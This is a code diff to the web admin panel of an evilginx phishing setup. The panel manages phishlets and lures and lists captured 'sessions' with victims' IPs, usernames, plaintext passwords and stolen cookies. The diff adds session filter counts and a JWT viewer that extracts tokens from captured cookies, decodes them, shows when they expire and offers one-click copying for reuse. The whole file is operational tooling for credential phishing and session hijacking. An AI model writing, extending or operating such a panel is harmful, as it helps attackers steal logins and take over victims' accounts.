@@ -79,7 +79,30 @@ tr:hover td{background:var(--accent-dim)}
 .badge.on{background:rgba(0,255,136,0.12);color:var(--accent);border:1px solid rgba(0,255,136,0.25)}
 .badge.off{background:rgba(239,68,68,0.1);color:var(--red);border:1px solid rgba(239,68,68,0.2)}
 .badge.jwt{background:rgba(167,139,250,0.12);color:var(--purple);border:1px solid rgba(167,139,250,0.25)}
+.badge.jwt.jwt-open{cursor:pointer;transition:background 0.2s,transform 0.15s,box-shadow 0.2s}
+.badge.jwt.jwt-open:hover{background:rgba(167,139,250,0.3);box-shadow:0 0 12px rgba(167,139,250,0.4);transform:translateY(-1px)}
 .sessFilter{border:1px solid var(--border);color:var(--text2);border-radius:8px;font-weight:600;transition:all 0.2s}
+.filt-n{display:inline-block;min-width:18px;margin-left:6px;padding:1px 7px;border-radius:999px;font-size:11px;font-weight:700;font-family:var(--mono);background:rgba(255,255,255,0.08);color:inherit;vertical-align:middle}
+.sessFilter.active .filt-n{background:rgba(10,14,23,0.22)}
+.modal.wide{max-width:980px}
+.jwt-box{display:flex;flex-direction:column;gap:16px}
+.jwt-range{padding:14px 16px;background:rgba(167,139,250,0.08);border:1px solid rgba(167,139,250,0.25);border-radius:10px;color:#fff;font-size:16px;font-weight:600;letter-spacing:0.2px}
+.jwt-range .lbl{display:block;font-size:11px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--purple);margin-bottom:6px}
+.jwt-enc{background:var(--bg);border:1px solid var(--border);border-radius:10px;padding:14px;font-family:var(--mono);font-size:12px;line-height:1.75;word-break:break-all;color:#fff;max-height:180px;overflow:auto}
+.jwt-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.jwt-card{background:var(--bg);border:1px solid var(--border);border-radius:10px;padding:14px;min-width:0}
+.jwt-card h4{font-size:11px;letter-spacing:1.5px;text-transform:uppercase;color:var(--accent);margin-bottom:10px}
+.jwt-json{margin:0;font-family:var(--mono);font-size:12px;color:#fff;white-space:pre-wrap;word-break:break-word;line-height:1.55}
+.jwt-dates{display:grid;gap:0}
+.jwt-dates .row{display:flex;justify-content:space-between;align-items:baseline;gap:12px;padding:9px 0;border-bottom:1px solid rgba(255,255,255,.06);font-size:13px}
+.jwt-dates .row:last-child{border-bottom:none}
+.jwt-dates .k{color:var(--text3);text-transform:uppercase;letter-spacing:1px;font-size:11px;font-weight:600}
+.jwt-dates .v{color:#fff;font-weight:600;text-align:right}
+.jwt-meta{font-size:12px;color:var(--text3)}
+.jwt-tabs{display:flex;flex-wrap:wrap;gap:8px}
+.jwt-tab{padding:6px 12px;border:1px solid var(--border);border-radius:8px;background:transparent;color:var(--text2);font-size:12px;font-weight:600;cursor:pointer;font-family:var(--font)}
+.jwt-tab.on{border-color:var(--purple);color:var(--purple);background:rgba(167,139,250,0.12)}
+@media(max-width:768px){.jwt-grid{grid-template-columns:1fr}}
 .sessFilter:hover{border-color:var(--accent);color:var(--accent)}
 .sessFilter.active{background:var(--accent);color:var(--bg);border-color:var(--accent);font-weight:700}
 .btn{padding:10px 20px;border:1px solid var(--border);color:var(--text);background:transparent;font-family:var(--font);font-size:13px;font-weight:600;cursor:pointer;border-radius:8px;transition:all 0.25s;letter-spacing:0.5px}
@@ -349,10 +372,10 @@ tr:hover td{background:var(--accent-dim)}
 <section id="page-sessions" class="page">
   <div class="sec-title"><i class="fa-solid fa-shield-halved"></i> Sessions</div>
   <div class="filter-row" id="sessFilters">
-    <button class="btn fill sessFilter active" data-filter="all" onclick="filterSessions('all',this)">ALL</button>
-    <button class="btn sessFilter" data-filter="jwt" onclick="filterSessions('jwt',this)"><i class="fa-solid fa-key"></i> WITH JWT</button>
-    <button class="btn sessFilter" data-filter="tokens" onclick="filterSessions('tokens',this)"><i class="fa-solid fa-cookie-bite"></i> WITH TOKENS</button>
-    <button class="btn sessFilter" data-filter="empty" onclick="filterSessions('empty',this)"><i class="fa-solid fa-ban"></i> EMPTY</button>
+    <button class="btn fill sessFilter active" data-filter="all" onclick="filterSessions('all',this)">ALL <span class="filt-n" data-cnt="all"></span></button>
+    <button class="btn sessFilter" data-filter="jwt" onclick="filterSessions('jwt',this)"><i class="fa-solid fa-key"></i> WITH JWT <span class="filt-n" data-cnt="jwt"></span></button>
+    <button class="btn sessFilter" data-filter="tokens" onclick="filterSessions('tokens',this)"><i class="fa-solid fa-cookie-bite"></i> WITH TOKENS <span class="filt-n" data-cnt="tokens"></span></button>
+    <button class="btn sessFilter" data-filter="empty" onclick="filterSessions('empty',this)"><i class="fa-solid fa-ban"></i> EMPTY <span class="filt-n" data-cnt="empty"></span></button>
     <div class="filter-spacer"></div>
     <div class="search-box"><i class="fa-solid fa-magnifying-glass"></i><input id="sessSearch" placeholder="Search by ID, IP, username..." oninput="searchSessions(this.value)"></div>
     <button class="btn" onclick="loadSessions()"><i class="fa-solid fa-arrows-rotate"></i> Refresh</button>
@@ -492,11 +515,179 @@ function editLure(idx){const l=allLures[idx];if(!l)return;let phOpts=allPhishlet
 async function saveLure(idx){const data={index:idx,phishlet:$('#elPhishlet').value,path:$('#elPath').value,redirect_url:$('#elRedirect').value,ua_filter:$('#elUa').value,og_title:$('#elOgTitle').value,og_desc:$('#elOgDesc').value,og_image:$('#elOgImg').value,og_url:$('#elOgUrl').value};const r=await api('/api/lures',{method:'PUT',body:JSON.stringify(data)});if(r.ok){closeModal();toast('Lure updated');loadLures()}else toast(r.error||'Error','err')}
 async function deleteLure(idx){if(!confirm(`Delete lure #${idx}?`))return;const r=await api('/api/lures',{method:'DELETE',body:JSON.stringify({index:idx})});if(r.ok){toast('Deleted');loadLures()}else toast(r.error||'Error','err')}
 function copyUrl(url){if(navigator.clipboard&&window.isSecureContext){navigator.clipboard.writeText(url).then(()=>toast('URL copied!')).catch(()=>toast('Copy failed','err'))}else{const ta=document.createElement('textarea');ta.value=url;ta.style.cssText='position:fixed;left:-9999px';document.body.appendChild(ta);ta.select();try{document.execCommand('copy');toast('URL copied!')}catch(e){toast('Copy failed','err')}document.body.removeChild(ta)}}
-async function loadSessions(filter){if(!filter)filter=currentSessFilter||'all';currentSessFilter=filter;var ldr=document.getElementById('sessLoader');if(ldr)ldr.classList.add('show');$('#sessCount').textContent='Loading...';try{const ss=await api('/api/sessions?filter='+filter);let html='';ss.forEach(s=>{html+=`<tr><td>${s.id}</td><td>${esc(s.phishlet)}</td><td>${esc(s.remote_addr)}</td><td>${s.n_cookies||0}</td><td>${s.has_jwt?'<span class="badge jwt">JWT</span>':'<span class="badge off">NO</span>'}</td><td>${esc(s.username||'\u2014')}</td><td>${esc(s.password||'\u2014')}</td><td>${ts(s.create_time)}</td><td><div class="btn-group"><button class="btn sm" onclick="viewSession(${s.id})"><i class="fa-solid fa-eye"></i> View</button><button class="btn sm danger" onclick="deleteSession(${s.id})"><i class="fa-solid fa-trash-can"></i></button></div></td></tr>`});if(!html)html='<tr><td colspan="9" style="text-align:center;color:var(--text3)">No sessions</td></tr>';$('#sessionsBody').innerHTML=html;$('#sessCount').textContent='Showing '+ss.length+' sessions ('+filter+')'}finally{if(ldr)ldr.classList.remove('show')}}
-function searchSessions(q){q=q.toLowerCase().trim();document.querySelectorAll('#sessionsBody tr').forEach(function(r){if(!q){r.style.display='';return}r.style.display=r.textContent.toLowerCase().includes(q)?'':'none'})}
-var currentSessFilter='all';function filterSessions(f,btn){document.querySelectorAll('.sessFilter').forEach(b=>b.classList.remove('active'));if(btn)btn.classList.add('active');loadSessions(f)}
+var currentSessFilter='all';
+var _jwtCache={id:null,list:[]};
+var SESS_FILTER_LABELS={all:'all',jwt:'JWT',tokens:'with tokens',empty:'empty'};
+function updateSessFilterCounts(counts){
+  ['all','jwt','tokens','empty'].forEach(function(k){
+    var el=document.querySelector('#sessFilters .filt-n[data-cnt="'+k+'"]');
+    if(el && typeof counts[k]==='number') el.textContent=counts[k];
+  });
+}
+function setSessCountText(n,filter,searching){
+  var el=$('#sessCount');if(!el)return;
+  var lab=SESS_FILTER_LABELS[filter]||filter;
+  var word=n===1?'session':'sessions';
+  if(searching) el.innerHTML='Showing <strong style="color:var(--accent)">'+n+'</strong> '+word+' <span style="color:var(--text3)">('+lab+' · search)</span>';
+  else el.innerHTML='Showing <strong style="color:var(--accent)">'+n+'</strong> '+word+' <span style="color:var(--text3)">('+lab+')</span>';
+}
+async function loadSessions(filter){
+  if(!filter)filter=currentSessFilter||'all';
+  currentSessFilter=filter;
+  var ldr=document.getElementById('sessLoader');
+  if(ldr)ldr.classList.add('show');
+  $('#sessCount').textContent='Loading...';
+  try{
+    const data=await api('/api/sessions?filter='+filter);
+    const ss=Array.isArray(data)?data:(data.sessions||[]);
+    updateSessFilterCounts(data.counts||{});
+    let html='';
+    ss.forEach(s=>{
+      const jwtCell=s.has_jwt
+        ?'<span class="badge jwt jwt-open" title="Open JWT" onclick="viewJwt('+s.id+',event)">JWT</span>'
+        :'<span class="badge off">NO</span>';
+      html+=`<tr><td>${s.id}</td><td>${esc(s.phishlet)}</td><td>${esc(s.remote_addr)}</td><td>${s.n_cookies||0}</td><td>${jwtCell}</td><td>${esc(s.username||'\u2014')}</td><td>${esc(s.password||'\u2014')}</td><td>${ts(s.create_time)}</td><td><div class="btn-group"><button class="btn sm" onclick="viewSession(${s.id})"><i class="fa-solid fa-eye"></i> View</button><button class="btn sm danger" onclick="deleteSession(${s.id})"><i class="fa-solid fa-trash-can"></i></button></div></td></tr>`;
+    });
+    if(!html)html='<tr><td colspan="9" style="text-align:center;color:var(--text3)">No sessions</td></tr>';
+    $('#sessionsBody').innerHTML=html;
+    var q=($('#sessSearch')&&$('#sessSearch').value)||'';
+    if(q) searchSessions(q);
+    else setSessCountText(ss.length,filter,false);
+  }finally{
+    if(ldr)ldr.classList.remove('show');
+  }
+}
+function searchSessions(q){
+  q=(q||'').toLowerCase().trim();
+  var vis=0,total=0;
+  document.querySelectorAll('#sessionsBody tr').forEach(function(r){
+    if(r.querySelector('td[colspan]'))return;
+    total++;
+    var show=!q||r.textContent.toLowerCase().includes(q);
+    r.style.display=show?'':'none';
+    if(show)vis++;
+  });
+  setSessCountText(q?vis:total,currentSessFilter||'all',!!q);
+}
+function filterSessions(f,btn){
+  document.querySelectorAll('#sessFilters .sessFilter').forEach(b=>b.classList.remove('active'));
+  if(btn)btn.classList.add('active');
+  loadSessions(f);
+}
+function cookieVal(ci){
+  if(ci==null)return '';
+  if(typeof ci==='string')return ci;
+  return ci.Value||ci.value||'';
+}
+function normalizeJwt(val){
+  val=String(val||'').trim();
+  if(val.toLowerCase().indexOf('bearer ')===0) val=val.slice(7).trim();
+  if((val.charAt(0)==='"'&&val.charAt(val.length-1)==='"')||(val.charAt(0)==="'"&&val.charAt(val.length-1)==="'")) val=val.slice(1,-1);
+  return val;
+}
+function looksJwt(name,val){
+  val=normalizeJwt(val);
+  if(val.indexOf('eyJ')!==0)return false;
+  if(name==='jwt_bridge')return true;
+  var p=val.split('.');
+  return p.length>=2 && p[0] && p[1];
+}
+function collectJwts(tokens){
+  var out=[];
+  Object.keys(tokens||{}).forEach(function(dom){
+    var cks=tokens[dom]||{};
+    Object.keys(cks).forEach(function(cn){
+      var val=cookieVal(cks[cn]);
+      if(looksJwt(cn,val)) out.push({domain:dom,name:cn,token:normalizeJwt(val)});
+    });
+  });
+  return out;
+}
+function b64urlDecode(str){
+  str=String(str||'').replace(/-/g,'+').replace(/_/g,'/');
+  while(str.length%4) str+='=';
+  try{
+    var bin=atob(str);
+    try{
+      return decodeURIComponent(bin.split('').map(function(c){return '%'+('00'+c.charCodeAt(0).toString(16)).slice(-2)}).join(''));
+    }catch(e){return bin}
+  }catch(e){return null}
+}
+function decodeJwtPart(part){
+  var raw=b64urlDecode(part);
+  if(raw==null)return null;
+  try{return JSON.parse(raw)}catch(e){return raw}
+}
+function jwtHumanDate(n){
+  if(typeof n!=='number'||!isFinite(n))return '';
+  if(n>1e12) n=Math.floor(n/1000);
+  var d=new Date(n*1000);
+  if(isNaN(d.getTime()))return '';
+  var months=['января','февраля','марта','апреля','мая','июня','июля','августа','сентября','октября','ноября','декабря'];
+  var hh=('0'+d.getHours()).slice(-2), mm=('0'+d.getMinutes()).slice(-2);
+  return d.getDate()+' '+months[d.getMonth()]+' '+d.getFullYear()+', '+hh+':'+mm;
+}
+function jwtDateOnly(n){
+  var full=jwtHumanDate(n);
+  return full?full.split(',')[0]:'';
+}
+function colorizeJwt(token){
+  var parts=String(token||'').split('.');
+  var colors=['#fb7185','#a78bfa','#22d3ee'];
+  return parts.map(function(p,i){return '<span style="color:'+colors[i%3]+'">'+esc(p)+(i<parts.length-1?'.':'')+'</span>'}).join('');
+}
+function renderJwtBody(item,list,sid){
+  var token=item.token||'';
+  var parts=token.split('.');
+  var header=parts[0]?decodeJwtPart(parts[0]):null;
+  var payload=parts[1]?decodeJwtPart(parts[1]):null;
+  var iat=(payload&&typeof payload==='object')?payload.iat:null;
+  var exp=(payload&&typeof payload==='object')?payload.exp:null;
+  var nbf=(payload&&typeof payload==='object')?payload.nbf:null;
+  var range='';
+  if(iat&&exp) range=jwtDateOnly(iat)+' \u2014 '+jwtDateOnly(exp);
+  else if(exp) range='до '+jwtDateOnly(exp);
+  else if(iat) range='с '+jwtDateOnly(iat);
+  var dateRows='';
+  [['iat (issued)',iat],['nbf (not before)',nbf],['exp (expires)',exp]].forEach(function(row){
+    var h=jwtHumanDate(row[1]);
+    if(h) dateRows+='<div class="row"><span class="k">'+row[0]+'</span><span class="v">'+esc(h)+'</span></div>';
+  });
+  var tabs='';
+  if(list.length>1){
+    tabs='<div class="jwt-tabs">'+list.map(function(x,i){
+      var on=x===item?' on':'';
+      return '<button class="jwt-tab'+on+'" onclick="showJwtIdx('+sid+','+i+')">'+esc(x.name)+'</button>';
+    }).join('')+'</div>';
+  }
+  var headerJson=header&&typeof header==='object'?JSON.stringify(header,null,2):String(header||'—');
+  var payloadJson=payload&&typeof payload==='object'?JSON.stringify(payload,null,2):String(payload||'—');
+  return '<div class="jwt-box">'+tabs+
+    (range?'<div class="jwt-range"><span class="lbl">Valid</span>'+esc(range)+'</div>':'')+
+    '<div class="jwt-meta">Cookie <span style="color:var(--accent)">'+esc(item.name)+'</span> @ <span style="color:var(--cyan)">'+esc(item.domain)+'</span></div>'+
+    '<div class="field" style="margin:0"><label>Encoded token</label><div class="jwt-enc">'+colorizeJwt(token)+'</div></div>'+
+    '<div class="jwt-grid"><div class="jwt-card"><h4>Decoded header</h4><pre class="jwt-json">'+esc(headerJson)+'</pre></div><div class="jwt-card"><h4>Decoded payload</h4><pre class="jwt-json">'+esc(payloadJson)+'</pre></div></div>'+
+    (dateRows?'<div class="jwt-card"><h4>Dates</h4><div class="jwt-dates">'+dateRows+'</div></div>':'')+
+    '</div>';
+}
+function showJwtIdx(sid,idx){
+  var item=_jwtCache.list[idx];
+  if(!item)return;
+  openModal('JWT \u2014 SESSION #'+sid, renderJwtBody(item,_jwtCache.list,sid),
+    '<button class="btn fill" onclick="copyUrl(_jwtCache.list['+idx+'].token)"><i class="fa-solid fa-copy"></i> COPY TOKEN</button><button class="btn" onclick="closeModal()">CLOSE</button>',
+    {wide:true});
+}
+async function viewJwt(id,ev){
+  if(ev){ev.preventDefault();ev.stopPropagation()}
+  const s=await api('/api/sessions/'+id);
+  if(s.error)return toast(s.error,'err');
+  var list=collectJwts(s.tokens||{});
+  if(!list.length)return toast('JWT not found in session #'+id,'err');
+  _jwtCache={id:id,list:list};
+  showJwtIdx(id,0);
+}
 
-async function viewSession(id){const s=await api(`/api/sessions/${id}`);if(s.error)return toast(s.error,'err');let cookieHtml='';for(const[dom,cks]of Object.entries(s.tokens||{})){for(const[cn,ci]of Object.entries(cks)){const val=ci.Value||ci.value||'';cookieHtml+=`<tr><td style="color:var(--cyan)">${esc(dom)}</td><td style="color:var(--accent)">${esc(cn)}</td><td>${esc(val.substring(0,120))}${val.length>120?'\u2026':''}</td></tr>`}}openModal(`SESSION #${id}`,`<div class="detail-grid"><div class="lbl">ID</div><div class="val">${s.id}</div><div class="lbl">Phishlet</div><div class="val">${esc(s.phishlet)}</div><div class="lbl">Remote IP</div><div class="val">${esc(s.remote_addr)}</div><div class="lbl">Landing URL</div><div class="val">${esc(s.landing_url)}</div><div class="lbl">User Agent</div><div class="val" style="font-size:12px">${esc(s.useragent)}</div><div class="lbl">Created</div><div class="val">${ts(s.create_time)}</div><div class="lbl">Updated</div><div class="val">${ts(s.update_time)}</div><div class="lbl">Has JWT</div><div class="val">${s.has_jwt?'<span class="badge jwt">YES</span>':'<span class="badge off">NO</span>'}</div></div><div class="sec-title" style="font-size:13px"><i class="fa-solid fa-cookie-bite"></i> Captured Cookies (${s.n_cookies})</div><div class="tbl-wrap"><table class="cookie-tbl"><thead><tr><th>Domain</th><th>Name</th><th>Value</th></tr></thead><tbody>${cookieHtml||'<tr><td colspan="3" style="text-align:center;color:var(--text3)">No cookies</td></tr>'}</tbody></table></div>`,`<button class="btn fill" onclick="downloadCookieJson(${id})"><i class="fa-solid fa-cloud-arrow-down"></i> Download JSON</button><button class="btn" onclick="closeModal()">CLOSE</button>`)}
+async function viewSession(id){const s=await api(`/api/sessions/${id}`);if(s.error)return toast(s.error,'err');let cookieHtml='';for(const[dom,cks]of Object.entries(s.tokens||{})){for(const[cn,ci]of Object.entries(cks)){const val=ci.Value||ci.value||'';cookieHtml+=`<tr><td style="color:var(--cyan)">${esc(dom)}</td><td style="color:var(--accent)">${esc(cn)}</td><td>${esc(val.substring(0,120))}${val.length>120?'\u2026':''}</td></tr>`}}openModal(`SESSION #${id}`,`<div class="detail-grid"><div class="lbl">ID</div><div class="val">${s.id}</div><div class="lbl">Phishlet</div><div class="val">${esc(s.phishlet)}</div><div class="lbl">Remote IP</div><div class="val">${esc(s.remote_addr)}</div><div class="lbl">Landing URL</div><div class="val">${esc(s.landing_url)}</div><div class="lbl">User Agent</div><div class="val" style="font-size:12px">${esc(s.useragent)}</div><div class="lbl">Created</div><div class="val">${ts(s.create_time)}</div><div class="lbl">Updated</div><div class="val">${ts(s.update_time)}</div><div class="lbl">Has JWT</div><div class="val">${s.has_jwt?'<span class="badge jwt jwt-open" title="Open JWT" onclick="viewJwt('+s.id+',event)">YES</span>':'<span class="badge off">NO</span>'}</div></div><div class="sec-title" style="font-size:13px"><i class="fa-solid fa-cookie-bite"></i> Captured Cookies (${s.n_cookies})</div><div class="tbl-wrap"><table class="cookie-tbl"><thead><tr><th>Domain</th><th>Name</th><th>Value</th></tr></thead><tbody>${cookieHtml||'<tr><td colspan="3" style="text-align:center;color:var(--text3)">No cookies</td></tr>'}</tbody></table></div>`,`<button class="btn fill" onclick="downloadCookieJson(${id})"><i class="fa-solid fa-cloud-arrow-down"></i> Download JSON</button>`+(s.has_jwt?`<button class="btn" onclick="viewJwt(${id})"><i class="fa-solid fa-key"></i> JWT</button>`:'')+`<button class="btn" onclick="closeModal()">CLOSE</button>`)}
 async function startEvilginx(){toast('Starting...');const r=await api('/api/ev/start',{method:'POST'});if(r.ok){toast('Started');updateEvStatus(r.running)}else toast('Failed','err')}
 async function stopEvilginx(){if(!confirm('Stop evilginx?'))return;toast('Stopping...');const r=await api('/api/ev/stop',{method:'POST'});if(r.ok){toast('Stopped');updateEvStatus(false)}}
 async function restartEvilginx(){toast('Restarting...');const r=await api('/api/ev/restart',{method:'POST'});if(r.ok){toast('Restarted');updateEvStatus(r.running)}else toast('Failed','err')}
@@ -560,8 +751,8 @@ function deleteSession(id){openModal('DELETE SESSION','<p style="color:#fff;marg
 async function doDeleteSession(id){const r=await api('/api/sessions/'+id,{method:'DELETE'});closeModal();if(r.error)toast(r.error,'err');else{toast('Session #'+id+' deleted');loadSessions();if(document.getElementById('page-dashboard')&&document.getElementById('page-dashboard').classList.contains('active'))loadDashboard()}}
 function openClearSessions(){openModal('CLEAR DATABASE','<p style="color:#fff;margin-bottom:14px">This will delete <strong style="color:var(--red)">ALL sessions</strong> from data.db.</p><p style="color:var(--text3);font-size:13px;margin-bottom:16px">The evilginx database structure is kept (id counter). Enter the panel admin password to confirm.</p><div class="field"><label>Admin password</label><input id="clrDbPass" type="password" placeholder="••••••••"></div>','<button class="btn danger" onclick="doClearSessions()"><i class="fa-solid fa-database"></i> DELETE ALL</button><button class="btn" onclick="closeModal()">CANCEL</button>')}
 async function doClearSessions(){var pw=($('#clrDbPass').value||'');if(!pw){toast('Password required','err');return}const r=await api('/api/sessions/clear',{method:'POST',body:JSON.stringify({password:pw})});if(r.error){toast(r.error,'err');return}closeModal();toast('Database cleared');loadSessions();loadDashboard()}
-function openModal(title,body,foot=''){$('#modalTitle').textContent=title;$('#modalBody').innerHTML=body;$('#modalFoot').innerHTML=foot;$('#modalOverlay').classList.add('show');attachFindReplace($('#modalBody'));bindCardTables()}
-function closeModal(){$('#modalOverlay').classList.remove('show')}
+function openModal(title,body,foot='',opts){opts=opts||{};var box=$('#modalOverlay').querySelector('.modal');if(box)box.classList.toggle('wide',!!opts.wide);$('#modalTitle').textContent=title;$('#modalBody').innerHTML=body;$('#modalFoot').innerHTML=foot;$('#modalOverlay').classList.add('show');attachFindReplace($('#modalBody'));bindCardTables()}
+function closeModal(){var ov=$('#modalOverlay');ov.classList.remove('show');var box=ov.querySelector('.modal');if(box)box.classList.remove('wide')}
 $('#modalOverlay').addEventListener('click',e=>{if(e.target===$('#modalOverlay'))closeModal()});
 document.addEventListener('keydown',e=>{if(e.key==='Escape')closeModal();if((e.ctrlKey||e.metaKey)&&e.key.toLowerCase()==='h'){var ov=$('#modalOverlay');if(ov&&ov.classList.contains('show')){e.preventDefault();var fi=ov.querySelector('.fr-find');if(fi)fi.focus();}}});
 loadDashboard();loadPhishlets();
